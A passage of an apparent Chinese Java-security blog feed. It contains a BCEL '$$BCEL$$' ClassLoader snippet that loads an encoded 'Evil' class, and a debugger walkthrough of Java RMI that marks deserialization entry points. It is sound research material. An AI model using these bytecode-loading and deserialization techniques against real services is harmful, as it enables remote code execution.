class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + encode).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来跟一下调用流程</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475436704-968d0652-4608-40ed-8403-1ba42538a004.png" alt=""></p><p>跟到loadclass里会调用这个creatClass方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475540748-0f7737d6-ef04-49b9-b2b2-fe920caaf441.png" alt=""></p><p>在<code>createClass()</code>中,通过<code>subString()</code>截取<code>$$BCEL$$</code>后的字符串，并调用<code>Utility.decode</code>进行相应的解码并最终返回改字节码的bytes数组(decode方法参数uncompress用来标识是否为zip流，当为true时走zip流解码)。之后生成<code>Parser</code>解析器并调用<code>parse()</code>方法进行解析，并生成<code>JavaClass</code>对象。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475782900-e6054f2a-4dde-4f5e-a4a6-11665607f06e.png" alt=""></p><p>之后在调用defineclass方法进行加载，后面就是调用newinstance进行初始化加载静态代码块了</p><p>参考：<a href="https://www.lianqing.xyz/?p=561">https://www.lianqing.xyz/?p=561</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java中动态加载字节码的方法&quot;&gt;Java中动态加载字节码的方法&lt;/h2&gt;
&lt;h3 id=&quot;1、利用-URLClassLoader-加载远程class文件&quot;&gt;1、利用 URLClassLoader 加载远程class文件&lt;/h3&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="字节码" scheme="https://oceanzbz.github.io/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>RMI反序列化</title>
    <link href="https://oceanzbz.github.io/post/9571b26f.html"/>
    <id>https://oceanzbz.github.io/post/9571b26f.html</id>
    <published>2024-12-30T03:47:56.000Z</published>
    <updated>2025-03-05T07:24:36.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RMI原理">RMI原理</h2><p>这部分已经记录过了也参考了许多佬的文章可以直接看自己的笔记</p><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/yk0fv5pk1ssnkqxr">Java Rmi原理</a></p><h2 id="RMI创建流程">RMI创建流程</h2><p>先提前给出源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IRemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">IRemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,iRemoteObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMIServer running!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建远程服务">创建远程服务</h3><p>下断点开始调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732171658349-888637d2-77ea-40ee-aec4-9247438d27af.png" alt=""></p><p>跟进去会跟到我们接口的实现类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732171706842-dfd51f75-edd9-412d-bba5-fea5b38afd37.png" alt=""></p><p>这里继承的是UnicastRemoteObject类所以继续跟进看看我们的对象是如何创建的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732174530067-5187ee0e-7cf7-4cc7-be24-496b06b85368.png" alt=""></p><p>这里其实就是会将远程对象发布到一个实际的端口上，跟进看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732174659131-32723ba4-fda1-4997-bb55-167a8def703e.png" alt=""></p><p>这里可以看到传入了一个远程对象和一个UnicastServerRef类前面的远程对象是真正的逻辑后面的是用于处理网络请求的。传进去一个端口，ip是自动获取的。继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180342636-98ef5246-1da6-4e31-befd-0eaaab920748.png" alt=""></p><p>继续跟到LiveRef类里面去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180399829-6168d19c-af70-4fdd-9ad4-88074518983e.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180429820-f924c85b-1a9d-4ca9-a0d3-c1a76e7a8a48.png" alt=""></p><p>这里调用了LiverRef的构造函数第一个是objectid后面是一个网络处理的类，这个类里面获取了ip可以自己跟跟看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180666520-9a22a062-2136-4710-9ec9-06ba1ae841a5.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180854518-1b6cbd9a-353b-4117-bef9-044c7ce5a3cd.png" alt=""></p><p>到这里就有了ip和真正处理网络请求的东西</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180877372-e7a402d3-176e-4293-93b4-5401c7affe3c.png" alt=""></p><p>这里就会调用父类UnicastrRef的构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180914892-e74884bb-901c-4d61-8d5a-500ca74d7961.png" alt="">其实就是一个赋值操作</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181076762-493c2e72-97f6-41c4-95b9-dba8394f4c61.png" alt="">又回到exportObject中继续向下跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181123623-32565726-d4db-472d-a7f4-6698b526a833.png" alt=""></p><p>然后这里传进来了我们之前创建的UnicastServerRef，然后又重新进行了赋值，但是这里面其实还是我们之前的LiveRef，然后接下来又调用了exportObject，在这整个过程中一直都在调用exportObject，只是在不同的类去调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181248778-ac9331cf-7a92-47c4-ac94-e126407a0547.png" alt=""></p><p>跟进来之后发现这里是创建了一个代理也就是之前所说的客户端真正调用的代理，也就是真正网络请求的东西</p><p>为什么要在服务端创建呢，其实通过前面的流程可以知道是服务端先创建好然后放到注册中心然后客户端在去注册中心调用这个代理。看一下具体是怎么创建的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181798893-73a40a3f-248d-4098-bcfc-763d63511154.png" alt=""></p><p>通过调用createProxy方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181770715-c57703fa-ee80-4299-b22b-ba0ae167a39a.png" alt=""></p><p>这里第一个参数就是就是远程对象的类， clientRef实际就是我们创建的liveRef。继续向下会有一个判断如果为True的话就会创建这个stub所以继续跟到stuClassExists方法判断是否为true或false</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182038750-0cd7046a-3dc4-4880-9c6e-25f1b14b8008.png" alt=""></p><p>然后在这里可以了解到，这里会在名字后加上<code>_Stub</code>，如果有这个类的话就会为真，但是我们没有写这个类，实际上是在JDK中自己定义了这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182320232-9dce16dd-6551-4bae-9c3f-8d7d021d3f5f.png" alt=""></p><p>如果说要调用这些类的话就会直接到这里面找，但是我们现在没有用到，这里也就是false，然后接下来就是一个创建动态代理标准流程，然后我们可以看见在handler中保存的还是我们之前的LiveRef</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182488239-278d1aee-8387-490a-b03e-e23fe161dabd.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182502246-bb11be6c-a72f-49c7-8c21-847ea1bbc11a.png" alt=""></p><p>然后我们的动态代理就创建好了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182566736-6578fe49-3898-486e-9ac2-f310405d46e0.png" alt=""></p><p>然后下一步就是创建了一个Target，其实就是一个总封装</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182769045-b9b19ab6-0024-4f0f-a48c-0474b1992ab6.png" alt=""></p><p>跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183210337-df8dc952-59dd-4f04-9d43-92eb1aa3c8bb.png" alt=""></p><p>这里的id和liveRef的id是同一个，这就说明这中间最核心的就是LiveRef</p><p>继续向下执行到<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183258597-f9ef7325-8305-4d6c-a5fc-0dad8cf76856.png" alt=""></p><p>跟进去然后我们跟到调用的部分，然后就跟进到TCPTransport的exportObject</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183305800-a957ee57-431e-4f9b-936b-73a22594363a.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183322741-0e141d8a-95a3-4047-9542-2091480dc9fa.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183336411-0aa0e293-9b71-4c11-aed3-83cc6bf9050f.png" alt=""></p><p>这里能够看到开启了listen(),也就是真正的对网络请求进行处理了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183488072-a9ccca25-8a0e-4767-83db-f320f70b3dee.png" alt=""></p><p>可以看到这里开启了一个新的线程区分于代码逻辑的线程，然后开启线程等到客户端的连接，然后在过程中也给端口进行了赋值（之前是默认值0）</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183565105-dbcc33ed-2a4f-4085-b243-767bcf3df472.png" alt=""></p><p>然后这个远程对象就已经发布出去了，继续向下执行到<code>super.exportObject(target);</code>跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183661797-d5dab711-1d72-4170-bbbf-11cb2ef7b1b5.png" alt=""></p><p>先是进行了一个赋值，然后执行putTarget</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183716784-3da1ec28-ec8b-4137-aca7-21b595d54556.png" alt=""></p><p>在这过程中这里将target保存在了自己定义的一个静态的表里面，然后到这里发布的整个过程就就完成了</p><h3 id="创建注册中心">创建注册中心</h3><p>创建注册中心的流程在大致上和创建远程服务的差不多，主要的差别就是在创建代理（<code>createProxy</code>）的时候</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732184659355-98eeca5b-ea5f-46e9-a782-b35639d790d9.png" alt=""></p><p>主要的不同点在这里可以看到在创建远程服务的时候是没有进入到这个逻辑里的</p><p>而在这里是会进入这个函数的，这是因为之前远程服务是找不到这个类，但是在创建注册中心的时候是能够在JDK自己的类中找到对应的类的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188107934-8b313186-8589-4b34-9d74-57f3cef02ce6.png" alt=""></p><p>然后直接<code>forName</code>创建代理类继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188209036-6122e2e7-ce9e-4efa-95ff-1a63b6b30a60.png" alt="">这里是判断一下是否是服务端创建出来的，如果为Ture就调用一个setSkeleton方法<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188258297-f7b87b3a-ab7c-4092-bf3e-ccfe055f784b.png" alt=""></p><p>然后调用createSkeleton，跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188302107-65149e36-ffcb-4b40-a80e-28af245e0071.png" alt="">Skeleton可以根据之前的流程图得知他是服务端的代理，然后这也是通过<code>forName</code>直接创建出来的</p><p>然后回到<code>UnicastServerRef#exportObject</code>可以发现impl中保存的ref中加了一个skel对象，接下就是创建Target，并且把Target保存，进入<code>ref.exportObject(target);</code>中，然后走到putTarget的位置</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188561503-9d77ebae-be84-4a9b-b181-bfc3af56e07d.png" alt="">然后查看ObjectTable中保存了一些什么，然后我们创建的远程对象应该都是保存在这个里面的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194004625-c70b101f-da76-4fb5-b76b-8d6c218e443e.png" alt=""></p><p>其中<code>DGCImpl_Stub</code>并不是我们创建的，这个是默认创建的一个分布式垃圾回收的类，这也是一个很重要的类，然后剩下的两个就是我们自己创建的两个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194019439-1e9aba74-aacd-40c9-bece-398747cc1fcb.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194029716-de94504c-d7f0-4d09-8496-9beee5f991ca.png" alt="">一个远程服务的动态代理Stub类这里面的skel为null，一个注册中心的Stub类并且里面存在一个skel</p><h3 id="绑定注册中心">绑定注册中心</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194596363-a7636587-80a3-4cb4-b3a7-f9d33b1978f1.png" alt=""></p><p>这里就是检查我们传进来的test有没有被绑定如果已经绑定就会报一个异常，没有的话就把它put进去。</p><h3 id="客户端请求注册中心-————-客户端">客户端请求注册中心 ———— 客户端</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732199700539-cddd0704-eb39-469f-b456-9fff6f2fffb5.png" alt=""></p><p>这里其实和之前服务端创建注册中心是一样的，这里也在是本地创建了一个LiveRef，然后把ip和端口放了进去，然后封装了一下，再然后就是又调用了<code>Util.createProxy</code>方法重新创建了一个Stub</p><p>接下来就是获取远程对象通过lookup</p><h4 id="反学序列化1">反学序列化1</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200324611-73dc2973-32d5-4d24-919c-c7bef5a8a5a2.png" alt=""></p><p>我们可以看到这里会将远程对象的名称进行序列化，那么同样的就可以想到注册中心肯定会反序列化读，这就是一个反序列化点。</p><p>接下来我们继续往下跟有个invoke方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200579372-4d028e22-2eb9-4434-87fd-9a4cd29a676f.png" alt=""></p><p>这里有个executeCall方法继续跟进去。</p><h4 id="反序列化2">反序列化2</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200901127-b8825baa-ab97-48ee-baf4-30833cf343be.png" alt=""></p><p>在这里的话如果产生了这个异常的话也会通过反序列化读出对象，这里的本意应该是如果产生了异常了就通过反序列化读出更详细的异常信息</p><h4 id="反序列化3">反序列化3</h4><p>这里我们回溯出来继续向下跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201029380-26e09f9e-5527-4f83-9c09-5010899743b3.png" alt=""></p><p>可以看到这里会从注册中心返回的输入流反序列化读取。</p><p>最后就是获取远程对象了</p><h3 id="客户端请求服务端————客户端">客户端请求服务端————客户端</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201831682-513c973a-b27b-409c-9ef4-497e9be114cd.png" alt=""></p><p>由于使用了动态代理所以必然会走到一个invoke方法里，看到下面调用了invokeRemoteMethod方法</p><p>跟进看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201897702-806cd96f-313b-4653-a6fc-66319eea389c.png" alt=""></p><p>继续跟到invoke</p><h4 id="反序列化4">反序列化4</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732202225575-1998b06b-4c19-4e6c-afbd-311c16c70259.png" alt=""></p><p>这里会调用一个executeCall方法之前说过这里会有一个反序列化点跟上文说的反序列化点2一致</p><p>继续向下跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732202348754-8bc9ac59-8bb7-4b4f-9323-02843f4f2652.png" alt=""></p><p>这里有一个unmarshalValue跟进去</p><h4 id="反序列化5">反序列化5</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732253271050-082eaac5-791e-463e-9321-1b6920c83775.png" alt=""></p><p>可以看到这里会通过反序列化获取远程对象传过来的值，并且类型不是基本类型就会反序列化。</p><h3 id="客户端请求注册中心————注册中心">客户端请求注册中心————注册中心</h3><p>在之前分析创建远程服务和注册中心是并没有仔细看listen方法里的逻辑，因为我们要看客户端请求注册中心之后注册中心的执行流程所以我们就在看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254006881-ee8d95c2-4ba6-4063-abc3-bb495d473834.png" alt=""></p><p>从listen的方法里创建了一个新的线程跟进AcceptLoop看看里面的run方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254214420-0c41e6ea-9af0-4243-8fe6-76a0e8055b2d.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254262622-f2da88e3-6332-4d2f-96a1-81f3627511e4.png" alt="">可以看到这里又创建了一个线程池，再看看他的run方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254336732-488d7b7b-380b-4854-add4-c539491f198d.png" alt=""></p><p>再看看run0</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254401964-9356a360-04fb-4ae2-a595-4c648e1c9bfb.png" alt="">重点是调用了handleMessages这个方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254548674-676cef27-9fa4-4293-a484-5b8a66ae928e.png" alt=""></p><p>默认会调用这个serviceCall方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254591977-aefcdc90-e43a-45e3-9b45-f7186830a95d.png" alt=""></p><p>可以看到这里会从Target获取一些东西看看这里面有什么东西,先下一个断点然后从客户端访问注册中心看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254836091-002ea0ff-71ed-47a3-b15e-833fc845cd7f.png" alt=""></p><p>可以看到已经断住了，然后我们看看Target里有什么</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254898542-68cc90dc-5adc-40be-87db-96d4d405d674.png" alt="">这里可以看到里面保存的就是我们之前创建的<code>RegistryImpl_Stub</code>，然后继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254956608-7f365c1a-a6d7-4791-9087-c6706ffda25c.png" alt=""></p><p>可以看到获取getDispatcher（分发器）</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255049201-16f49f56-88ea-4085-bee5-52db7a7c6712.png" alt=""></p><p>在这里面保存了skel，然后在后面执行了<code>disp.dispatch(impl, call);</code>，跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255116879-d7868ac1-79a6-4658-9a13-f80620c730a1.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255175150-1a59a586-8715-4ac1-abf9-00431bf992d6.png" alt=""></p><p>这里skel不是null就会调用oldDispatch跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255277532-72323e1c-d30f-4c6d-8ff5-1f5ac2fbb8a1.png" alt=""></p><p>这里又调用了dispatch继续跟进去</p><h4 id="反序列化6">反序列化6</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    